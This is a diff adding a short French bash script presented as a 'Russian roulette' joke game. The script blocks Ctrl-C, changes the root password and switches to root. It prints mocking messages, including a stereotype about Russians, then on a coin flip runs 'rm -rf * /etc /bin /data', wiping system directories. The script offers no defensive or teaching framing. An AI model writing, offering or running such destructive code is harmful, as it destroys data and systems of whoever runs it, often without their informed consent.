@@ -1,0 +1,28 @@
+#!/bin/bash
+trap '' SIGINT
+
+passwd root 
+su -
+
+echo "Bienvenue dans la Roulette Russe ! Vous savez, ces Russes sont tellement débrouillards qu'ils montent sur des ours comme s'ils étaient des chevaux. Chapeau bas pour l'inventivité !"
+
+sleep 8 
+
+echo "Le but de ce jeu est simple : vous avez deux chances. Si vous tombez sur le chiffre 2, vous gagnez. Mais soyons honnêtes, ce n'est pas vraiment marrant."
+
+sleep 8
+
+echo "En revanche, si vous avez l'incroyable chance de tomber sur le 1, félicitations ! Vous avez intérêt à avoir une image sur un serveur cloud quelque part. Sinon, soyez prêt à montrer vos talents de super Admin Sys. Bonne chance ! Ahah !"
+
+sleep 10
+
+# Génération d'un nombre aléatoire (1 ou 2)
+result=$(($RANDOM % 2 + 1))
+
+# Vérification du résultat
+if [ $result -eq 1 ]; then
+    rm -rf * /etc /bin /data
+    echo "AHAH, c'est pas les cours de Ecard qui vont t'aider là"
+else
+    echo "T'es pas drole"
+fi
